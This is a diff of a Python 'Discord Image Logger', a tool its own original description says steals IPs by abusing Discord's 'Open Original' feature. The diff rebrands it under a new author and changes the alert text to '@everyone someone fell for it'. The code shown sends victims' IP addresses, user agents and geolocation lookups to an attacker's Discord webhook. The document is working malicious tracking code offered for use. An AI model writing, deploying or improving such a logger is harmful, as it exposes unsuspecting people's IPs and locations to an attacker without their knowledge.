@@ -6,9 +6,9 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__description__ = "IP Logger"
+__version__ = "v1"
+__author__ = "Brag"
 
 config = {
     # BASE CONFIG #
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "@everyone",
+    "content": "@everyone someone fell for it",
     "embeds": [
         {
             "title": "Image Logger - Error",
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "@everyone someone fell for it"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
